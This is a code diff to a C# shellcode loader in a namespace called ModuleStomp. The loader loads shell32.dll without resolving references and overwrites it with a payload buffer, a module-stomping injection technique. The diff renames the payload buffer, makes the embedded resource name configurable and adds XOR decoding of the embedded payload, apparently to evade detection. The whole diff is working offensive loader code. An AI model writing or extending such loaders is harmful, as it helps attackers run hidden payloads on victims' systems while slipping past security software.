@@ -12,7 +12,7 @@ namespace ModuleStomp
 {
     class Execute
     {
-        public static byte[] buf;
+        public static byte[] mybytearr;
         public static uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
         
         public static void exec()
@@ -20,7 +20,7 @@ namespace ModuleStomp
             ByteORRaw();
             var modulname = "shell32.dll";
             MLoadLibraryExW(modulname, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
-            Stomp(buf);
+            Stomp(mybytearr);
 
         }
 
@@ -82,20 +82,27 @@ namespace ModuleStomp
         {
             if (GetCode.UseRaw == true)
             {
-                buf = GetEmbeddedBin("dotnetlib");
+               // buf = GetEmbeddedBin("dotnetlib");
+                mybytearr = GetEmbeddedBin(GetCode.ResName);
+                for (int i = 0; i < mybytearr.Length; i++)
+                {
+                    mybytearr[i] ^= 0x4e;
+                    mybytearr[i] ^= 0x2e;
+
+                }
 
             }
             else
             {
                 //3d4f0f8e
                 Stack<byte> recvStack = GetCode.CodeStack();
-                buf = new byte[recvStack.Count];
+                mybytearr = new byte[recvStack.Count];
                 int payloadLen = recvStack.Count;
                 for (int i = 0; i <= payloadLen; i++)
                 {
                     try
                     {
-                        buf[i] = recvStack.Pop();
+                        mybytearr[i] = recvStack.Pop();
                     }
                     catch { break; }
 
